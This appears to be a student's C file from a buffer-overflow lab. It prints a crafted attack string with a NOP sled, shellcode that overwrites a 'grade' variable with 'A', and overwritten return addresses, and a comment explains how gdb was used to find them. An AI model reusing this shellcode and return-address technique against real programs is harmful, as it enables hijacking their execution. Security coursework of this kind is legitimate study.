#include <stdio.h>
#include <string.h>

//I started by looking at the gdb run of the program and then found the the grade location of the variable grade. My shellcode is pushing the value of A into the grade variable and then push the address of the next instruction and then returns to to main in the executable. I have also modified the return address at the end of my shellcode to return to the the buffer address where I had my codes (copy a to grade and push and ret). my code only works in gdb and it gives me an A  

char attackString[] = "\x46\x61\x72\x69\x64\x20\x52\x61\x6a\x61\x62\x69\x20\x4e\x69\x61\x00\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc6\x05\x2c\xa0\x04\x08\x41\x68\xdc\x85\x04\x08\xc3\x00\x00\x00\x28\xde\xff\xff\xf0\xdd\xff\xff\x80\xa0\x04\x08";


//char attackString[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n";

int main() {
 int i;
 char *p = attackString;
 for (i = 0; i < sizeof(attackString); i++) {
 putchar(*p);
 p++;
 }
 return 1;
}
